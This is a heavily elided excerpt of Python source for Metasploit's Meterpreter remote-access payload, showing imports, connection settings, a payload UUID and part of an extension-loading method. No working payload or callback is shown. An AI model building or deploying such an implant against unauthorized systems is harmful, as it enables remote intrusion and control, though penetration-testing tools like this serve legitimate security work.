...
try:
    urllib_imports = ['ProxyBasicAuthHandler', 'ProxyHandler', 'HTTPSHandler', 'Request', 'build_opener',
...
HTTP_HOST = None
HTTP_REFERER = None
PAYLOAD_UUID = '268b62be6f7e5852b67ca368d75f1a82'
...
class PythonMeterpreter(object):
    ...
    def _core_loadlib(self, request, response):
        ...
        libname = '???'
        match = re.search(r'^meterpreter\.register_extension\(\'([a-zA-Z0-9]+)\'\)$', str(data_tlv['value']),
                          re.MULTILINE)
